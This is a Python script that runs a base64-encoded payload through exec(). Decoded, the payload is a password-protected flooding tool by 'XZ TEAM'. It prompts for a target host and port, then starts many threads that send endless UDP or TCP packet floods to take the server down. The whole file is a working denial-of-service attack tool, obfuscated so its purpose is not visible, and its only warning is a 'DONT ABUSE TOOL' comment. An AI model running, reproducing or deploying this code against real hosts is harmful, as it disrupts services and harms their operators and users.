import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojQ29kZSBCeSBaWAojRE9OVCBBQlVTRSBUT09MCmltcG9ydCB0aW1lCmltcG9ydCByYW5kb20KaW1wb3J0IHNvY2tldAppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCBvcwoKb3Muc3lzdGVtKCJjbGVhciIpCnBhc3N3b3JkID0iWFpURUFNIgoKZm9yIGkgaW4gcmFuZ2UoMyk6Cglwd2QgPSBpbnB1dCgiW+KWql0gUEFTU1dPUkQ6ICIpCglqPTMKCWlmKHB3ZD09cGFzc3dvcmQpOgoJCXRpbWUuc2xlZXAoNSkKCQlwcmludCgiW+KWql0gV2FpdCA1IFNlY29uZHMgVG8gU3RhcnQgRERPUyEhISAiKQoJCWJyZWFrCgllbHNlOgoJCXRpbWUuc2xlZXAoNSkKCQlwcmludCgiW8OXXSBQYXNzd29yZCBTYWxhaCEhISAiKQoJCWNvbnRpbnVlCnRpbWUuc2xlZXAoNSkKcHJpbnQoInviiJp9IFBhc3N3b3JkIEJlbmFyIikKdGltZS5zbGVlcCg1KQoKcHJpbnQoIiIiXDAzM1s5Mm0KCiAgIF9fX19fICAgICAgICBfXyAgX18gICAgIF9fX19fCiB8X18gIC9fX18gIF9fX1wgXC8gLyAgIF98X18gIC8KICAgLyAvLyBfIFwvIF8gXFwgIC8gfCB8IHwgLyAvIAogIC8gL3wgIF9fLyAgX18vLyAgXCB8X3wgfC8gL18gCiAvX19fX1xfX198XF9fXy9fL1xfXF9fLCAvX19fX3wKICAgICAgICAgICAgICAgICAgICB8X19fLyAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICIiIikKcHJpbnQoIuKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRieKRiSIpCnByaW50KCIgfCBBVVRIT1IgOiBaZWVYeVoiKQpwcmludCgiIHwgR0lUSFVCIDogaHR0cHM6Ly9naXRodWIuY29tL1plZVh5elovRGRvcyIpCnByaW50KCIgfCBESVNDT1JEIDogISBaZWVYeVojMzA3MiAgICAgICAgICAgICAgICAgICIpCnByaW50KCIgfCBNWSBURUFNIDogaHR0cHM6Ly9kaXNjb3JkLmdnL3VHcERIdmF1NUEiKQpwcmludCgi4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJ4pGJIikKaXAgPSBzdHIoaW5wdXQoIiBIT1NUL0lQOiIpKQpwb3J0ID0gaW50KGlucHV0KCIgUE9SVDoiKSkKY2hvaWNlID0gc3RyKGlucHV0KCIgR0FTIERET1MoeS9uKToiKSkKdGltZXMgPSBpbnQoaW5wdXQoIiBQQUNLRVQ6IikpCnRocmVhZHMgPSBpbnQoaW5wdXQoIiBJU0kgUEFDS0VUOiIpKQpkZWYgcnVuKCk6CiAgICBkYXRhID0gcmFuZG9tLl91cmFuZG9tKCg5MDI0KSkKICAgIGkgPSByYW5kb20uY2hvaWNlKCgiW1RPSyBUT0sgVE9LXSIsIltUT0sgVE9LIFRPS10iKSkKICAgIHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pCiAgICAgICAgICAgIGFkZHIgPSAoc3RyKGlwKSxpbnQocG9ydCkpCiAgICAgICAgICAgIGZvciB4IGluIHJhbmdlKHRpbWVzKToKICAgICAgICAgICAgICAgIHMuc2VuZHRvKGRhdGEsYWRkcikKICAgICAgICAgICAgcHJpbnQoaSArIiBQRVJNSVNJIFBBS0VUIEZST00gWFogVEVBTSIpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgiWyNdIFNFUlZFUiBJUyBET1dOISEhIikKCmRlZiBydW4yKCk6CiAgICBkYXRhID0gcmFuZG9tLl91cmFuZG9tKDE2KQogICAgaSA9IHJhbmRvbS5jaG9pY2UoKCJbVE9LIFRPSyBUT0tdIiwiW1RPSyBUT0sgVE9LXSIpKQogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgICAgIHMuY29ubmVjdCgoaXAscG9ydCkpCiAgICAgICAgICAgIHMuc2VuZChkYXRhKQogICAgICAgICAgICBmb3IgeCBpbiByYW5nZSh0aW1lcyk6CiAgICAgICAgICAgICAgICBzLnNlbmQoZGF0YSkKICAgICAgICAgICAgcHJpbnQoaSArIiBQRVJNSVNJIFBBS0VUIEZST00gWFpURUFNIikKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHMuY2xvc2UoKQogICAgICAgICAgICBwcmludCgiWyNdIFNFUlZFUiBJUyBET1dOISEhIikKICAgICAgICAKZm9yIHkgaW4gcmFuZ2UodGhyZWFkcyk6CiAgICBpZiBjaG9pY2UgPT0gJ3knOgogICAgICAgIHRoID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQgPSBydW4pCiAgICAgICAgdGguc3RhcnQoKQogICAgZWxzZToKICAgICAgICB0aCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0ID0gcnVuMikKICAgICAgICB0aC5zdGFydCgp'))